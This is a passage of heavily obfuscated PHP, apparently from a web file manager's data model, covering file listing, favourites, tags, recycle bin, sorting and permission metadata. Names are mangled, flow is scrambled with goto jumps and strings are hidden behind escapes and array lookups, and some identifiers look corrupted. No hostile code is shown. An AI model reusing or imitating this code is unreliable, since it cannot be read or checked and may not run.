$this->cacheRemove($BäÏßÅ¶»Ø); $aîòÒæ»† = array(); goto e­º¼¾ã¸†; e­º¼¾ã¸†: $AÚßæäá¢– = is_array($dğ”ÔÔåŒ¿) ? $dğ”ÔÔåŒ¿ : array($dğ”ÔÔåŒ¿ => $d„èƒœ¢ª); foreach ($AÚßæäá¢– as $FÜ¥¹™‘ => $cÍ§Ò…¶°£) { if (is_array($cÍ§Ò…¶°£)) { $cÍ§Ò…¶°£ = json_encode_force($cÍ§Ò…¶°£); } $this->checkLength($cÍ§Ò…¶°£, !1, $this->tableName . $bàÅàÅ„›ö[4] . $dğ”ÔÔåŒ¿); $cÍ§Ò…¶°£ = self::textEncode($cÍ§Ò…¶°£); $AÚßæäá¢– = array($bàÅàÅ„›ö[29] => $BäÏßÅ¶»Ø, $bàÅàÅ„›ö[89] => $FÜ¥¹™‘, $bàÅàÅ„›ö[355] => $cÍ§Ò…¶°£); $aîòÒæ»†[] = $this->filterWhere($AÚßæäá¢–); } if (!$aîòÒæ»†) { return !0; } goto eñÃ³í‹Ì²; BùÛŞ¤…É: } protected function optionDefault($Fï²Ê¾½ä÷ = '') { return !1; } public function setDeep($E†‚±ª†”¬, $Bƒ·•Ã¬™ = false, $DÁç”¯ÌíÁ = '') { $c·±Î¢Õ± = explode($_SERVER[Ä¿Ş°¨][91], $E†‚±ª†”¬); $D’£—ëŸ÷Ç = $this->get(); array_set_value($D’£—ëŸ÷Ç, $E†‚±ª†”¬, $Bƒ·•Ã¬™); $this->set($c·±Î¢Õ±[0], $D’£—ëŸ÷Ç[$c·±Î¢Õ±[0]], $DÁç”¯ÌíÁ); } public function remove($bâ¯ô¹òä›, $a¡··˜ÊÅñ = '') { $B¦ó…Å¦ù =& $_SERVER[Ä¿Ş°¨]; $this->cacheRemove($a¡··˜ÊÅñ); $E¾È¨äÇ‚ = $this->filterWhere(array($B¦ó…Å¦ù[89] => $bâ¯ô¹òä›, $B¦ó…Å¦ù[29] => $a¡··˜ÊÅñ)); if (is_null($bâ¯ô¹òä›)) { unset($E¾È¨äÇ‚[$B¦ó…Å¦ù[89]]); } return $this->where($E¾È¨äÇ‚)->delete(); } public function cacheSet($Bá´øŞö†, $d•ËÌ‘À¸° = false) { return Cache::set($this->cacheKey($Bá´øŞö†), $d•ËÌ‘À¸°); } public function cacheGet($b³é®§¹ìñ) { return Cache::get($this->cacheKey($b³é®§¹ìñ)); } public function cacheRemove($d·ÆŸŒ±¬Í) { return Cache::remove($this->cacheKey($d·ÆŸŒ±¬Í)); } protected function filterWhere($FŒ”º×‚”¨) { return $FŒ”º×‚”¨; } protected function cacheKey($dÙÕÒ±ñ±ø) { return $dÙÕÒ±ñ±ø; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\x61\155\145" => "\151\x6f\137\163\157\165\x72\143\x65\x5f\x6d\x65\x74\141", "\155\x65\164\141\x46\x69\x65\154\x64" => "\163\157\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\151\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\x72\x74", "\146\165\x6e\143\x74\x69\x6f\156"), array("\143\162\x65\141\x74\145\x54\x69\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\x6e\143\x74\x69\157\x6e"), array("\x76\x69\x65\167\x54\x69\155\145", "\164\x69\155\145", "\151\156\x73\x65\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dœÈçÕœ¯) { return $this->listSource(array($_SERVER[Ä¿Ş°¨][373] => $dœÈçÕœ¯)); } public function typeName($d‡š‰ÙÆÕò) { static $f½ÃÇßØ†à = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $f½ÃÇßØ†à[$d‡š‰ÙÆÕò . $_SERVER[Ä¿Ş°¨][33]]; } public function sourceListInfo($aŞ§Ä­Ãˆé, $E´ï‡©áªæ = false) { goto B„Ê¢¿ãËñ; DÔ‚¢Íœê§: if (!$aŞ§Ä­Ãˆé) { return array(); } $a°µµÊÎ®² = $this->where(array($f¯ƒš†ø[374] => array($f¯ƒš†ø[7], $aŞ§Ä­Ãˆé)))->select(); $this->_listDataApply($a°µµÊÎ®², $E´ï‡©áªæ); goto d¬˜‘ç×¾; d¬˜‘ç×¾: return array_to_keyvalue($a°µµÊÎ®², $f¯ƒš†ø[374]); goto FÅ¸çÂƒê; B„Ê¢¿ãËñ: $f¯ƒš†ø =& $_SERVER[Ä¿Ş°¨]; $aŞ§Ä­Ãˆé = $aŞ§Ä­Ãˆé ? $aŞ§Ä­Ãˆé : array(); $aŞ§Ä­Ãˆé = array_filter(array_unique($aŞ§Ä­Ãˆé)); goto DÔ‚¢Íœê§; FÅ¸çÂƒê: } public function pathInfoFilter($b…¡¾Şå²Ì) { goto d¾·Õóäóô; AË±âÁÅÆ¯: $bß§Ôã’ë¼ .= $cÙöÚ®´‚Ê[379]; $bß§Ôã’ë¼ .= $cÙöÚ®´‚Ê[380]; $D¨¾Á¢Ã¾ = explode($cÙöÚ®´‚Ê[47], $bß§Ôã’ë¼); goto Aˆ¸ŞĞ’Ã; e¨Ùà•ì: $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[376]] = $this->typeName($b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[376]]); if ($b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[375]] != 1) { $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[156]] = $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[377]]; unset($b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[377]]); } $bß§Ôã’ë¼ = $cÙöÚ®´‚Ê[378]; goto AË±âÁÅÆ¯; Aˆ¸ŞĞ’Ã: if (isset($b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[381]]) && $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[381]][$cÙöÚ®´‚Ê[382]] == -1) { $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[183]); $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[106]); $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[383]); $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[384]); $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[77]); $D¨¾Á¢Ã¾ = array_remove_value($D¨¾Á¢Ã¾, $cÙöÚ®´‚Ê[385]); } $b…¡¾Şå²Ì = array_field_key($b…¡¾Şå²Ì, $D¨¾Á¢Ã¾); return $b…¡¾Şå²Ì; goto CÁ ôãí¤³; d¾·Õóäóô: $cÙöÚ®´‚Ê =& $_SERVER[Ä¿Ş°¨]; $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[75]] = KodIO::make($b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[374]]); $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[29]] = $b…¡¾Şå²Ì[$cÙöÚ®´‚Ê[375]] == 1 ? $cÙöÚ®´‚Ê[76] : $cÙöÚ®´‚Ê[163]; goto e¨Ùà•ì; CÁ ôãí¤³: } public function listUserFav() { goto b¨áÅ‰Ÿ¡©; A‡ô‚Á‚ëÍ: foreach ($f‰Ï¸ÈŒ©Ä as &$c–ÚéÚ°˜—) { $c–ÚéÚ°˜— = array($Bğ„ƒèâ‹‡[390] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[372]], $Bğ„ƒèâ‹‡[391] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[28]], $Bğ„ƒèâ‹‡[392] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[75]], $Bğ„ƒèâ‹‡[393] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[29]], $Bğ„ƒèâ‹‡[394] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[183]], $Bğ„ƒèâ‹‡[395] => $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[106]]); if ($c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[29]] == $Bğ„ƒèâ‹‡[387] && $A¥»Ä³ñ—[$c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[75]]]) { $c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[396]] = $A¥»Ä³ñ—[$c–ÚéÚ°˜—[$Bğ„ƒèâ‹‡[75]]]; } } return $f‰Ï¸ÈŒ©Ä; goto Bğ¸” ¤å; A†‰™„¥Éê: $fËÒŒ‡Ö» = array_to_keyvalue($fËÒŒ‡Ö», $Bğ„ƒèâ‹‡[33], $Bğ„ƒèâ‹‡[75]); if ($fËÒŒ‡Ö») { $A¥»Ä³ñ— = $this->listSource(array($Bğ„ƒèâ‹‡[388] => array($Bğ„ƒèâ‹‡[389], $fËÒŒ‡Ö»))); } $A¥»Ä³ñ— = array_to_keyvalue($A¥»Ä³ñ—[$Bğ„ƒèâ‹‡[350]], $Bğ„ƒèâ‹‡[374]); goto A‡ô‚Á‚ëÍ; b¨áÅ‰Ÿ¡©: $Bğ„ƒèâ‹‡ =& $_SERVER[Ä¿Ş°¨]; $f‰Ï¸ÈŒ©Ä = Model($Bğ„ƒèâ‹‡[386])->listData(); $fËÒŒ‡Ö» = array_filter_by_field($f‰Ï¸ÈŒ©Ä, $Bğ„ƒèâ‹‡[29], $Bğ„ƒèâ‹‡[387]); goto A†‰™„¥Éê; Bğ¸” ¤å: } public function listUserTag($c¥áÅ¾Ä¬ç) { goto f±›ŞƒËïÊ; f±›ŞƒËïÊ: $cï’ºåÄĞ« =& $_SERVER[Ä¿Ş°¨]; $FÛ¡®ñƒÙ¯ = Model($cï’ºåÄĞ«[397])->listData(); $aÕçƒ´Äª = array_filter_by_field($FÛ¡®ñƒÙ¯, $cï’ºåÄĞ«[398], $c¥áÅ¾Ä¬ç); goto c‡Ï•¡÷£ˆ; D—ôŠøÚãé: return $this->listSource($d½”áÂ“©Š); goto b„Š¯½™‡Ã; c‡Ï•¡÷£ˆ: $aÕçƒ´Äª = array_to_keyvalue($aÕçƒ´Äª, $cï’ºåÄĞ«[33], $cï’ºåÄĞ«[75]); if (!$aÕçƒ´Äª) { return array(); } $d½”áÂ“©Š = array($cï’ºåÄĞ«[388] => array($cï’ºåÄĞ«[389], $aÕçƒ´Äª)); goto D—ôŠøÚãé; b„Š¯½™‡Ã: } public function listUserRecycle() { $cõˆ¥˜¿×Ê =& $_SERVER[Ä¿Ş°¨]; $a‡ŒŒÖ¼î… = Model($cõˆ¥˜¿×Ê[399])->listData(); if (!$a‡ŒŒÖ¼î…) { return array(); } $B«‰¢Ô…À¤ = array($cõˆ¥˜¿×Ê[388] => array($cõˆ¥˜¿×Ê[389], $a‡ŒŒÖ¼î…), $cõˆ¥˜¿×Ê[400] => 1); return $this->listSource($B«‰¢Ô…À¤); } public function listSource($f«í‰—®Ê, $a¼Ç‹‚éÇè = 3000) { goto cËÇ¯ßˆôó; cËÇ¯ßˆôó: $d¡õ“ùİÉõ =& $_SERVER[Ä¿Ş°¨]; if (!isset($f«í‰—®Ê[$d¡õ“ùİÉõ[401]])) { $f«í‰—®Ê[$d¡õ“ùİÉõ[401]] = 0; } $dçÈ …‚À© = $d¡õ“ùİÉõ[402]; goto bÃŞÕ¼¥ˆ; b†Û»µ‹í¼: return $a¤œ®™Íçœ; goto eÛš›­Ë£Ş; bÃŞÕ¼¥ˆ: $a¤œ®™Íçœ = $this->field($dçÈ …‚À©)->_makeOrder()->where($f«í‰—®Ê)->selectPage($a¼Ç‹‚éÇè); $this->_listDataApply($a¤œ®™Íçœ[$d¡õ“ùİÉõ[350]]); $this->_listMake($a¤œ®™Íçœ); goto b†Û»µ‹í¼; eÛš›­Ë£Ş: } protected function _makeOrder() { goto Cç§œØÑ‚Ù; Cç§œØÑ‚Ù: $bä‚¿Ş÷† =& $_SERVER[Ä¿Ş°¨]; $bãêÏËäÜ“ = Model($bä‚¿Ş÷†[403])->get($bä‚¿Ş÷†[404]); $DŒ¢Å¤‘í = Model($bä‚¿Ş÷†[403])->get($bä‚¿Ş÷†[405]); goto EàÒß˜ÑÊ‹; EàÒß˜ÑÊ‹: $EÄ®«ÎŞÛÚ = array($bä‚¿Ş÷†[406] => $bä‚¿Ş÷†[407], $bä‚¿Ş÷†[408] => $bä‚¿Ş÷†[409]); $bÄäô©“‡Ë = array($bä‚¿Ş÷†[28] => $bä‚¿Ş÷†[28], $bä‚¿Ş÷†[77] => $bä‚¿Ş÷†[77], $bä‚¿Ş÷†[156] => $bä‚¿Ş÷†[377], $bä‚¿Ş÷†[383] => $bä‚¿Ş÷†[383], $bä‚¿Ş÷†[410] => $bä‚¿Ş÷†[384], $bä‚¿Ş÷†[183] => $bä‚¿Ş÷†[183], $bä‚¿Ş÷†[106] => $bä‚¿Ş÷†[106]); $FõºŒ½Ó“ = Input::get($bä‚¿Ş÷†[411], $bä‚¿Ş÷†[7], $bãêÏËäÜ“, array_keys($bÄäô©“‡Ë)); goto e‘»ÜÓŞ; f×î¼ğ‘ù: if ($FõºŒ½Ó“ == $bä‚¿Ş÷†[28]) { } $bÒ¯²Ó¹Çí = $bä‚¿Ş÷†[413] . $bÄäô©“‡Ë[$FõºŒ½Ó“] . $bä‚¿Ş÷†[50] . $EÄ®«ÎŞÛÚ[$E©œ¤–ßÀ¿]; return $this->order(rtrim(trim($bÒ¯²Ó¹Çí), $bä‚¿Ş÷†[47])); goto C¿›š‹µéÖ; e‘»ÜÓŞ: $E©œ¤–ßÀ¿ = Input::get($bä‚¿Ş÷†[412], $bä‚¿Ş÷†[7], $DŒ¢Å¤‘í, array_keys($EÄ®«ÎŞÛÚ)); if (!in_array($FõºŒ½Ó“, array_keys($bÄäô©“‡Ë))) { $FõºŒ½Ó“ = $bä‚¿Ş÷†[28]; } if (!in_array($E©œ¤–ßÀ¿, array_keys($EÄ®«ÎŞÛÚ))) { $FõºŒ½Ó“ = $bä‚¿Ş÷†[406]; } goto f×î¼ğ‘ù; C¿›š‹µéÖ: } protected function _listDataApplyItem($Eßêƒ¿™¯Â, $bÃÂ‹à®òĞ = false) { $bğ¡ –œ…„ = array($Eßêƒ¿™¯Â); $this->_listDataApply($bğ¡ –œ…„, $bÃÂ‹à®òĞ); return $bğ¡ –œ…„[0]; } protected function _listDataApply(&$Cƒö½Ö›£ë, $a»Ÿ°„’µå = false) { goto CöÒ—„Á‡§; dƒŞÜ÷Úæ: $this->_listAppendPath($Cƒö½Ö›£ë); $this->_listAppendAuth($Cƒö½Ö›£ë); $this->_listAppendSourceInfo($Cƒö½Ö›£ë, $dÆ¾ÑèĞÁ™); goto d©ÙŸÉÃñ; d©ÙŸÉÃñ: $this->_listAppendUser($Cƒö½Ö›£ë); $this->_listFilterInfo($Cƒö½Ö›£ë, $a»Ÿ°„’µå); goto BŸƒ·°Úì; CöÒ—„Á‡§: $bÊç—‚¨ïá =& $_SERVER[Ä¿Ş°¨]; if (!$Cƒö½Ö›£ë) { $Cƒö½Ö›£ë = array(); return; } $dÆ¾ÑèĞÁ™ = array_to_keyvalue($Cƒö½Ö›£ë, $bÊç—‚¨ïá[33], $bÊç—‚¨ïá[374]); goto DÜçŒÒ¤Œ×; DÜçŒÒ¤Œ×: $dÆ¾ÑèĞÁ™ = array_unique($dÆ¾ÑèĞÁ™); $this->_listSourceCache($Cƒö½Ö›£ë); if (!$a»Ÿ°„’µå) { $this->_listAppendMeta($Cƒö½Ö›£ë, $dÆ¾ÑèĞÁ™); $this->_listAppendFileMeta($Cƒö½Ö›£ë, $dÆ¾ÑèĞÁ™); $this->_listAppendChildren($Cƒö½Ö›£ë, $dÆ¾ÑèĞÁ™); } goto dƒŞÜ÷Úæ; BŸƒ·°Úì: } protected function _listSourceCache($a«ï²°Í‰) { $DÎÓÙŸ»Ôî =& $_SERVER[Ä¿Ş°¨]; foreach ($a«ï²°Í‰ as $E…õ™ŠÇ·ò) { self::$cacheSourceInfo[$DÎÓÙŸ»Ôî[414] . $E…õ™ŠÇ·ò[$DÎÓÙŸ»Ôî[374]]] = $E…õ™ŠÇ·ò; } } protected function _listFilterInfo(&$BŞ³Å¡ƒ, $Eğ‡ñòÍ = false) { $E¬´É©È¯ =& $_SERVER[Ä¿Ş°¨]; foreach ($BŞ³Å¡ƒ as &$AÌç…˜Ïö) { $AÌç…˜Ïö = $this->pathInfoFilter($AÌç…˜Ïö); self::$cachePathInfo[$E¬´É©È¯[415] . intval($Eğ‡ñòÍ) . $E¬´É©È¯[416] . $AÌç…˜Ïö[$E¬´É©È¯[374]]] = $AÌç…˜Ïö; } } protected function _listMake(&$AßÕç·öì) { $a®­É–ª‰˜ =& $_SERVER[Ä¿Ş°¨]; $AßÕç·öì[$a®­É–ª‰˜[74]] = array(); $AßÕç·öì[$a®­É–ª‰˜[73]] = array(); foreach ($AßÕç·öì[$a®­É–ª‰˜[350]] as $EÙµœ±’) { $cî‹—“øÄÙ = $EÙµœ±’[$a®­É–ª‰˜[375]] == 1 ? $a®­É–ª‰˜[74] : $a®­É–ª‰˜[73]; $AßÕç·öì[$cî‹—“øÄÙ][] = $EÙµœ±’; } unset($AßÕç·öì[$a®­É–ª‰˜[350]]); } protected function _listAppendMeta(&$cŠÒ¤îÄ£×, $BŠæÛØ¦‘´) { goto D¾İƒ¢È“¦; aë£íÊ¼ŞÇ: if (!$bÂÄ¸‚œŒ¶) { return; } $c×å¥¿ÎŠø = array($e­—å­õ¯[419], $e­—å­õ¯[420]); $f‰Í÷Î¨ÆŒ = array(); goto CÀ§†”ñë¬; D¾İƒ¢È“¦: $e­—å­õ¯ =& $_SERVER[Ä¿Ş°¨]; $fª••Ôßƒ½ = array($e­—å­õ¯[388] => array($e­—å­õ¯[389], $BŠæÛØ¦‘´)); $bÂÄ¸‚œŒ¶ = Model($e­—å­õ¯[417])->field($e­—å­õ¯[418])->where($fª••Ôßƒ½)->select(); goto aë£íÊ¼ŞÇ; CÀ§†”ñë¬: foreach ($bÂÄ¸‚œŒ¶ as $b¤·’£Ÿ×«) { if (!isset($f‰Í÷Î¨ÆŒ[$b¤·’£Ÿ×«[$e­—å­õ¯[374]]])) { $f‰Í÷Î¨ÆŒ[$b¤·’£Ÿ×«[$e­—å­õ¯[374]]] = array(); } if (in_array($b¤·’£Ÿ×«[$e­—å­õ¯[89]], $c×å¥¿ÎŠø)) { continue; } $f‰Í÷Î¨ÆŒ[$b¤·’£Ÿ×«[$e­—å­õ¯[374]]][$b¤·’£Ÿ×«[$e­—å­õ¯[89]]] = $b¤·’£Ÿ×«[$e­—å­õ¯[355]]; } foreach ($cŠÒ¤îÄ£× as &$d¶ó…ªÑÒù) { $d¶ó…ªÑÒù[$e­—å­õ¯[421]] = !1; if (isset($f‰Í÷Î¨ÆŒ[$d¶ó…ªÑÒù[$e­—å­õ¯[374]]])) { $d¶ó…ªÑÒù[$e­—å­õ¯[421]] = $f‰Í÷Î¨ÆŒ[$d¶ó…ªÑÒù[$e­—å­õ¯[374]]]; } if ($this->fileIsLock($d¶ó…ªÑÒù) && $d¶ó…ªÑÒù[$e­—å­õ¯[381]]) { $DäØ°ä¹ƒÍ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $d¶ó…ªÑÒù[$e­—å­õ¯[381]][$e­—å­õ¯[382]] = AuthModel::authDisable($d¶ó…ªÑÒù[$e­—å­õ¯[381]][$e­—å­õ¯[382]], $DäØ°ä¹ƒÍ); $d¶ó…ªÑÒù[$e­—å­õ¯[381]][$e­—å­õ¯[422]][$e­—å­õ¯[381]] = $d¶ó…ªÑÒù[$e­—å­õ¯[381]][$e­—å­õ¯[382]]; } } goto d³œÈ©ù£Î; d³œÈ©ù£Î: } protected function _listAppendFileMeta(&$dö‘òÔˆàÃ, $d×èÄÈ‹ —) { goto D†Ÿ¤ï½—ã; D³Áš”ôš¦: $dÁÙ‹£©Š = Model($bÜáù¦„§¶[426])->field($FùÛšï²³)->where($D™øèÊæëø)->select(); $dÁÙ‹£©Š = array_to_keyvalue($dÁÙ‹£©Š, $bÜáù¦„§¶[423]); $F„ÇõˆÉó = Model($bÜáù¦„§¶[427])->field($bÜáù¦„§¶[428])->where($D™øèÊæëø)->select(); goto c«‡Ï¼ŠÀ ; a§†‚ğ˜ÕÓ: foreach ($dö‘òÔˆàÃ as &$Eğ¿î°êÎ¯) { goto E¯•Ê££Ğç; E¯•Ê££Ğç: $AíšŠ³™‘ = $Eğ¿î°êÎ¯[$bÜáù¦„§¶[423]]; if (!$AíšŠ³™‘ || !isset($dÁÙ‹£©Š[$AíšŠ³™‘])) { continue; } $fÀÕº°·£õ = $dÁÙ‹£©Š[$AíšŠ³™‘]; goto b¥Óñ¨ùÚ; b¥Óñ¨ùÚ: $fÀÕº°·£õ[$bÜáù¦„§¶[77]] = $Eğ¿î°êÎ¯[$bÜáù¦„§¶[77]]; $fÀÕº°·£õ[$bÜáù¦„§¶[28]] = $Eğ¿î°êÎ¯[$bÜáù¦„§¶[28]]; self::$cacheFileInfo[$bÜáù¦„§¶[429] . $AíšŠ³™‘] = $fÀÕº°·£õ; goto BÜ˜ŠËĞß; BÜ˜ŠËĞß: unset($dÁÙ‹£©Š[$AíšŠ³™‘][$bÜáù¦„§¶[75]]); $FÁçœ‘¹Ñ = is_array($A¦î£¥¦ê¤[$AíšŠ³™‘]) ? $A¦î£¥¦ê¤[$AíšŠ³™‘] : array(); $Eğ¿î°êÎ¯[$bÜáù¦„§¶[158]] = array_merge($FÁçœ‘¹Ñ, $dÁÙ‹£©Š[$AíšŠ³™‘]); goto bÛ…‡²ó¨; bÛ…‡²ó¨: if (isset($Eğ¿î°êÎ¯[$bÜáù¦„§¶[158]][$bÜáù¦„§¶[430]])) { $Eğ¿î°êÎ¯[$bÜáù¦„§¶[430]] = json_decode($Eğ¿î°êÎ¯[$bÜáù¦„§¶[158]][$bÜáù¦„§¶[430]], !0); unset($Eğ¿î°êÎ¯[$bÜáù¦„§¶[158]][$bÜáù¦„§¶[430]]); } goto b‘„˜Êá ; b‘„˜Êá : } goto f®¥Ø‘£Û’; F–Íâëˆƒ: if (!$FÌîÏÎ—Ğ¿) { return; } $D™øèÊæëø = array($bÜáù¦„§¶[424] => array($bÜáù¦„§¶[389], $FÌîÏÎ—Ğ¿)); $FùÛšï²³ = $bÜáù¦„§¶[425]; goto D³Áš”ôš¦; c«‡Ï¼ŠÀ : $F„ÇõˆÉó = $F„ÇõˆÉó ? $F„ÇõˆÉó : array(); $A¦î£¥¦ê¤ = array(); foreach ($F„ÇõˆÉó as $E÷Ä®Ä„£¶) { if (!isset($A¦î£¥¦ê¤[$E÷Ä®Ä„£¶[$bÜáù¦„§¶[423]]])) { $A¦î£¥¦ê¤[$E÷Ä®Ä„£¶[$bÜáù¦„§¶[423]]] = array(); } $A¦î£¥¦ê¤[$E÷Ä®Ä„£¶[$bÜáù¦„§¶[423]]][$E÷Ä®Ä„£¶[$bÜáù¦„§¶[89]]] = $E÷Ä®Ä„£¶[$bÜáù¦„§¶[355]]; } goto a§†‚ğ˜ÕÓ; D†Ÿ¤ï½—ã: $bÜáù¦„§¶ =& $_SERVER[Ä¿Ş°¨]; $FÌîÏÎ—Ğ¿ = array_to_keyvalue($dö‘òÔˆàÃ, $bÜáù¦„§¶[33], $bÜáù¦„§¶[423]); $FÌîÏÎ—Ğ¿ = array_filter(array_unique($FÌîÏÎ—Ğ¿)); goto F–Íâëˆƒ; f®¥Ø‘£Û’: } protected function _listAppendSourceInfo(&$eïÌŞ±Øè, $E¬á¥Î˜”ç) { goto Bçù‘Ù´å½; Bçù‘Ù´å½: $eÎ¦Äƒİ‰» =& $_SERVER[Ä¿Ş°¨]; if (!defined($eÎ¦Äƒİ‰»[431])) { return; } $aÓ˜„°§¸Å = Model($eÎ¦Äƒİ‰»[432])->listData(); goto AÎÖˆÈõ¹¬; FŒÑõÛƒ„¯: $aØÆèË‰Äµ = array_to_keyvalue($aÓ˜„°§¸Å, $eÎ¦Äƒİ‰»[372]); $bÀ®òå“Œ¬ = array_to_keyvalue_group($a—²³âÊ¼Ñ, $eÎ¦Äƒİ‰»[75], $eÎ¦Äƒİ‰»[398]); $Cíš Ò¨‘ù = array_to_keyvalue($C¥÷æËÙì„, $eÎ¦Äƒİ‰»[75]); goto EåŞÇğë»î; EåŞÇğë»î: $EîõÇ„ŞÖ¹ = array_to_keyvalue_group($AÂœ¾Îø§è, $eÎ¦Äƒİ‰»[374]); foreach ($eïÌŞ±Øè as &$E´„¦¾¥) { $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]] = array($eÎ¦Äƒİ‰»[434] => 0, $eÎ¦Äƒİ‰»[435] => 0, $eÎ¦Äƒİ‰»[436] => 0); if (isset($Cíš Ò¨‘ù[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]])) { $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[437]] = 1; $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[438]] = $Cíš Ò¨‘ù[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]][$eÎ¦Äƒİ‰»[28]]; } if (isset($bÀ®òå“Œ¬[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]])) { $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[439]] = array(); foreach ($bÀ®òå“Œ¬[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]] as $A‘ù¸ˆ¦Æì) { $eòáæ«¡¿æ = $aØÆèË‰Äµ[$A‘ù¸ˆ¦Æì]; $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[439]][] = array($eÎ¦Äƒİ‰»[440] => $eòáæ«¡¿æ[$eÎ¦Äƒİ‰»[372]], $eÎ¦Äƒİ‰»[391] => $eòáæ«¡¿æ[$eÎ¦Äƒİ‰»[28]], $eÎ¦Äƒİ‰»[441] => $eòáæ«¡¿æ[$eÎ¦Äƒİ‰»[442]]); } } if (isset($EîõÇ„ŞÖ¹[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]])) { $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[443]] = array(); foreach ($EîõÇ„ŞÖ¹[$E´„¦¾¥[$eÎ¦Äƒİ‰»[374]]] as $f´ ±ç¼ğ) { $E´„¦¾¥[$eÎ¦Äƒİ‰»[396]][$eÎ¦Äƒİ‰»[443]] = array($eÎ¦Äƒİ‰»[444] => $f´ ±ç¼ğ[$eÎ¦Äƒİ‰»[445]], $eÎ¦Äƒİ‰»[446] => $f´ ±ç¼ğ[$eÎ¦Äƒİ‰»[447]], $eÎ¦Äƒİ‰»[448] => $f´ ±ç¼ğ[$eÎ¦Äƒİ‰»[374]], $eÎ¦Äƒİ‰»[449] => $f´ ±ç¼ğ[$eÎ¦Äƒİ‰»[450]], $eÎ¦Äƒİ‰»[451] => $f´ ±ç¼ğ[$eÎ¦Äƒİ‰»[452]]); } } } return $eïÌŞ±Øè; goto cÒ­ë¤•ùŒ; AÎÖˆÈõ¹¬: $a—²³âÊ¼Ñ = Model($eÎ¦Äƒİ‰»[397])->listData(); $C¥÷æËÙì„ = Model($eÎ¦Äƒİ‰»[386])->listData(); $AÂœ¾Îø§è = Model($eÎ¦Äƒİ‰»[433])->listSimple(); goto FŒÑõÛƒ„¯; cÒ­ë¤•ùŒ: } protected function _listAppendChildren(&$dĞñàƒªÅƒ, $F¯¶Î°ß’) { goto fˆ±æÌ«æ‡; E‹İ‡Ğ÷ÈÎ: foreach ($dĞñàƒªÅƒ as &$aŠŠÃ‡ÒÚ ) { if ($aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[375]]) { unset($aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[377]]); $aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[188]] = intval($Dƒï²ŒÕ[$aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[374]] . $DÂÔ™Ó“œÓ[455]][$DÂÔ™Ó“œÓ[456]]); $aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[187]] = intval($Dƒï²ŒÕ[$aŠŠÃ‡ÒÚ [$DÂÔ™Ó“œÓ[374]] . $DÂÔ™Ó“œÓ[457]][$DÂÔ™Ó“œÓ[456]]); } } goto C¬ÚÛ¯ìß¢; Aœ„¿œÛÙï: $F¹‡øáóì = $this->tablePrefix . $this->tableName; for ($a°·œÔàÀ = 0; $a°·œÔàÀ < $EÈ”¥•¿àß; $a°·œÔàÀ++) { $B’µÇƒ•©£ = intval($dĞñàƒªÅƒ[$a°·œÔàÀ][$DÂÔ™Ó“œÓ[401]]); if ($dĞñàƒªÅƒ[$a°·œÔàÀ][$DÂÔ™Ó“œÓ[375]]) { $dÀ¡Šëñ²î = $dĞñàƒªÅƒ[$a°·œÔàÀ][$DÂÔ™Ó“œÓ[374]]; $C§ƒ³¾§ .= 